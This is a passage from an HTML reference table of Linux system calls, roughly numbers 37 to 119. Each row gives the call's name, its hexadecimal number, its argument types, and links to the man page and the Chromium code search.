href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*linkat">cs/</a></td><td align="center">0x25</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>int flags</td><td>-</td></tr><tr><td align="center">38</td><td>renameat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat">cs/</a></td><td align="center">0x26</td><td>int olddfd</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td></tr><tr><td align="center">39</td><td>umount2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umount2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umount2">cs/</a></td><td align="center">0x27</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">40</td><td>mount</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mount.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mount">cs/</a></td><td align="center">0x28</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td>-</td></tr><tr><td align="center">41</td><td>pivot_root</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pivot_root.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pivot_root">cs/</a></td><td align="center">0x29</td><td>const char *new_root</td><td>const char *put_old</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">42</td><td>nfsservctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nfsservctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nfsservctl">cs/</a></td><td align="center">0x2a</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">43</td><td>statfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs">cs/</a></td><td align="center">0x2b</td><td>const char * path</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">44</td><td>fstatfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs">cs/</a></td><td align="center">0x2c</td><td>unsigned int fd</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">45</td><td>truncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate">cs/</a></td><td align="center">0x2d</td><td>const char *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">46</td><td>ftruncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate">cs/</a></td><td align="center">0x2e</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">47</td><td>fallocate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fallocate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fallocate">cs/</a></td><td align="center">0x2f</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td>-</td></tr><tr><td align="center">48</td><td>faccessat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/faccessat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*faccessat">cs/</a></td><td align="center">0x30</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">49</td><td>chdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chdir">cs/</a></td><td align="center">0x31</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">50</td><td>fchdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchdir">cs/</a></td><td align="center">0x32</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">51</td><td>chroot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chroot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chroot">cs/</a></td><td align="center">0x33</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">52</td><td>fchmod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmod">cs/</a></td><td align="center">0x34</td><td>unsigned int fd</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">53</td><td>fchmodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmodat">cs/</a></td><td align="center">0x35</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">54</td><td>fchownat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchownat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchownat">cs/</a></td><td align="center">0x36</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td>-</td></tr><tr><td align="center">55</td><td>fchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown">cs/</a></td><td align="center">0x37</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">56</td><td>openat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/openat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*openat">cs/</a></td><td align="center">0x38</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td></tr><tr><td align="center">57</td><td>close</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/close.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*close">cs/</a></td><td align="center">0x39</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">58</td><td>vhangup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vhangup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vhangup">cs/</a></td><td align="center">0x3a</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">59</td><td>pipe2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe2">cs/</a></td><td align="center">0x3b</td><td>int *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">60</td><td>quotactl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/quotactl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*quotactl">cs/</a></td><td align="center">0x3c</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td>-</td><td>-</td></tr><tr><td align="center">61</td><td>getdents64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents64">cs/</a></td><td align="center">0x3d</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">62</td><td>lseek</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lseek">cs/</a></td><td align="center">0x3e</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int whence</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">63</td><td>read</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/read.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*read">cs/</a></td><td align="center">0x3f</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">64</td><td>write</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/write.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*write">cs/</a></td><td align="center">0x40</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">65</td><td>readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readv">cs/</a></td><td align="center">0x41</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">66</td><td>writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*writev">cs/</a></td><td align="center">0x42</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">67</td><td>pread64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pread64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pread64">cs/</a></td><td align="center">0x43</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">68</td><td>pwrite64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwrite64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwrite64">cs/</a></td><td align="center">0x44</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">69</td><td>preadv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv">cs/</a></td><td align="center">0x45</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">70</td><td>pwritev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev">cs/</a></td><td align="center">0x46</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">71</td><td>sendfile</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile">cs/</a></td><td align="center">0x47</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td align="center">72</td><td>pselect6</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pselect6.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pselect6">cs/</a></td><td align="center">0x48</td><td>int</td><td>fd_set *</td><td>fd_set *</td><td>fd_set *</td><td>struct __kernel_timespec *</td><td>void *</td></tr><tr><td align="center">73</td><td>ppoll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ppoll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ppoll">cs/</a></td><td align="center">0x49</td><td>struct pollfd *</td><td>unsigned int</td><td>struct __kernel_timespec *</td><td>const sigset_t *</td><td>size_t</td><td>-</td></tr><tr><td align="center">74</td><td>signalfd4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd4">cs/</a></td><td align="center">0x4a</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">75</td><td>vmsplice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vmsplice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vmsplice">cs/</a></td><td align="center">0x4b</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">76</td><td>splice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/splice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*splice">cs/</a></td><td align="center">0x4c</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">77</td><td>tee</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tee.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tee">cs/</a></td><td align="center">0x4d</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">78</td><td>readlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlinkat">cs/</a></td><td align="center">0x4e</td><td>int dfd</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td></tr><tr><td align="center">79</td><td>newfstatat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/newfstatat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*newfstatat">cs/</a></td><td align="center">0x4f</td><td>int dfd</td><td>const char *filename</td><td>struct stat *statbuf</td><td>int flag</td><td>-</td><td>-</td></tr><tr><td align="center">80</td><td>fstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat">cs/</a></td><td align="center">0x50</td><td>unsigned int fd</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">81</td><td>sync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync">cs/</a></td><td align="center">0x51</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">82</td><td>fsync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsync">cs/</a></td><td align="center">0x52</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">83</td><td>fdatasync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fdatasync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fdatasync">cs/</a></td><td align="center">0x53</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">84</td><td>sync_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync_file_range">cs/</a></td><td align="center">0x54</td><td>int fd</td><td>loff_t offset</td><td>loff_t nbytes</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">85</td><td>timerfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_create">cs/</a></td><td align="center">0x55</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">86</td><td>timerfd_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_settime">cs/</a></td><td align="center">0x56</td><td>int ufd</td><td>int flags</td><td>const struct __kernel_itimerspec *utmr</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td></tr><tr><td align="center">87</td><td>timerfd_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_gettime">cs/</a></td><td align="center">0x57</td><td>int ufd</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">88</td><td>utimensat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimensat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimensat">cs/</a></td><td align="center">0x58</td><td>int dfd</td><td>const char *filename</td><td>struct __kernel_timespec *utimes</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">89</td><td>acct</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/acct.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*acct">cs/</a></td><td align="center">0x59</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">90</td><td>capget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capget">cs/</a></td><td align="center">0x5a</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">91</td><td>capset</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capset.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capset">cs/</a></td><td align="center">0x5b</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">92</td><td>personality</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/personality.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*personality">cs/</a></td><td align="center">0x5c</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">93</td><td>exit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit">cs/</a></td><td align="center">0x5d</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">94</td><td>exit_group</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit_group.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit_group">cs/</a></td><td align="center">0x5e</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">95</td><td>waitid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/waitid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*waitid">cs/</a></td><td align="center">0x5f</td><td>int which</td><td>pid_t pid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td>-</td></tr><tr><td align="center">96</td><td>set_tid_address</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_tid_address.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_tid_address">cs/</a></td><td align="center">0x60</td><td>int *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">97</td><td>unshare</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unshare.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unshare">cs/</a></td><td align="center">0x61</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">98</td><td>futex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futex">cs/</a></td><td align="center">0x62</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct __kernel_timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td align="center">99</td><td>set_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_robust_list">cs/</a></td><td align="center">0x63</td><td>struct robust_list_head *head</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">100</td><td>get_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_robust_list">cs/</a></td><td align="center">0x64</td><td>int pid</td><td>struct robust_list_head * *head_ptr</td><td>size_t *len_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">101</td><td>nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nanosleep">cs/</a></td><td align="center">0x65</td><td>struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">102</td><td>getitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getitimer">cs/</a></td><td align="center">0x66</td><td>int which</td><td>struct itimerval *value</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">103</td><td>setitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setitimer">cs/</a></td><td align="center">0x67</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval *ovalue</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">104</td><td>kexec_load</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kexec_load.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kexec_load">cs/</a></td><td align="center">0x68</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td>-</td><td>-</td></tr><tr><td align="center">105</td><td>init_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/init_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*init_module">cs/</a></td><td align="center">0x69</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">106</td><td>delete_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/delete_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*delete_module">cs/</a></td><td align="center">0x6a</td><td>const char *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">107</td><td>timer_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_create">cs/</a></td><td align="center">0x6b</td><td>clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t * created_timer_id</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">108</td><td>timer_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_gettime">cs/</a></td><td align="center">0x6c</td><td>timer_t timer_id</td><td>struct __kernel_itimerspec *setting</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">109</td><td>timer_getoverrun</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_getoverrun.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_getoverrun">cs/</a></td><td align="center">0x6d</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">110</td><td>timer_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_settime">cs/</a></td><td align="center">0x6e</td><td>timer_t timer_id</td><td>int flags</td><td>const struct __kernel_itimerspec *new_setting</td><td>struct __kernel_itimerspec *old_setting</td><td>-</td><td>-</td></tr><tr><td align="center">111</td><td>timer_delete</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_delete.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_delete">cs/</a></td><td align="center">0x6f</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">112</td><td>clock_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_settime">cs/</a></td><td align="center">0x70</td><td>clockid_t which_clock</td><td>const struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">113</td><td>clock_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_gettime">cs/</a></td><td align="center">0x71</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">114</td><td>clock_getres</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_getres.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_getres">cs/</a></td><td align="center">0x72</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">115</td><td>clock_nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_nanosleep">cs/</a></td><td align="center">0x73</td><td>clockid_t which_clock</td><td>int flags</td><td>const struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td></tr><tr><td align="center">116</td><td>syslog</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syslog.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syslog">cs/</a></td><td align="center">0x74</td><td>int type</td><td>char *buf</td><td>int len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">117</td><td>ptrace</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ptrace">cs/</a></td><td align="center">0x75</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td>-</td><td>-</td></tr><tr><td align="center">118</td><td>sched_setparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setparam">cs/</a></td><td align="center">0x76</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">119</td><td>sched_setscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setscheduler">cs/</a></td><td align="center">0x77</td><td>pid_t 